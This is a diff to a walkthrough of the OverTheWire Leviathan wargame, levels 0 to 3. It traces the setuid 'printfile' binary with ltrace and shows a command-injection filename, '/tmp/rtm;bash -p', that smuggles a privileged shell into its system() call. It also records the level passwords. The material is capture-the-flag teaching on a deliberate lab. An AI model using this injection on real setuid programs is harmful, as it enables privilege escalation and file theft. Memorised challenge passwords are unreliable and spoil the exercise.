@@ -16,7 +16,7 @@ Level 0
  ssh leviathan0@bandit.labs.overthewire.org -p 2223
  password: leviathan0
 Write up:
-1. ls -la
+1. ls  -la
    output:
     drwxr-x---  2 leviathan1 leviathan0 4096 Aug 26  2019 .backup
 2.  cd .backup
@@ -69,9 +69,60 @@ Write up:
  1. ls
   output:  printfile
 
+ 2. ltrace ./printfile '/etc/leviathan_pass/leviathan2'  # We have  permission to  this  file
+    output:
+	 __libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 
+ 	access("/etc/leviathan_pass/leviathan2", 4)      = 0
+ 	snprintf("/bin/cat /etc/leviathan_pass/lev"…, 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
+	geteuid()                                        = 12002
+ 	geteuid()                                        = 12002
+ 	setreuid(12002, 12002)                           = 0
+ 	system("/bin/cat /etc/leviathan_pass/lev"…ougahZi8Ta
+  
+ 	--- SIGCHLD (Child exited) ---
+ 	<… system resumed> )                           = 0
+ 	+++ exited (status 0) +++
+
+   
+   Reviewing the ltrace, it can be determined:
+
+     ./printfile accepts a filename argument.
+      /bin/cat is used to output the requested file.
+      access() checks if user leviathan2 has sufficient permissions.
+      A string is prepared using snprintf(), concatenating /bin/cat with the supplied argument.
+      setreuid() sets the real and effective UID of leviathan3.
+      system() call supplied with the above string.
+
+
+3.Attempting to run the printfile executable supplied with leviathan3‘s password file we are met with an error:
+
+  ltrace ./printfile '/etc/leviathan_pass/leviathan3'#  # We do not have  permission to  this  file
+  output:
+       ....
+       access("/etc/leviathan_pass/leviathan3", 4)      = -1
+       puts("You cant have that file…"You cant have that file…
+       )               = 27
+      +++ exited (status 1) +++
+
+
+  In this case, user leviathan2 does not have the necessary permissions to access a file owned by leviathan3.
+  
+  
+  touch /tmp/rtm;bash -p
+  ./printfile '/tmp/rtm;bash -p'
+  whoami 
+       output:leviathan3
+  cat /etc/leviathan_pass/leviathan3   
+        output:Ahdiemoo1j
+  
  
-leviathan2 Level 2 → Level 3
-leviathan3 Level 3 → Level 4
+leviathan3  
+ssh leviathan3@bandit.labs.overthewire.org -p 2223 
+  password: Ahdiemoo1j
+  
+  
+  
+  
 leviathan4 Level 4 → Level 5
 leviathan5 Level 5 → Level 6
 leviathan6 Level 6 → Level 7
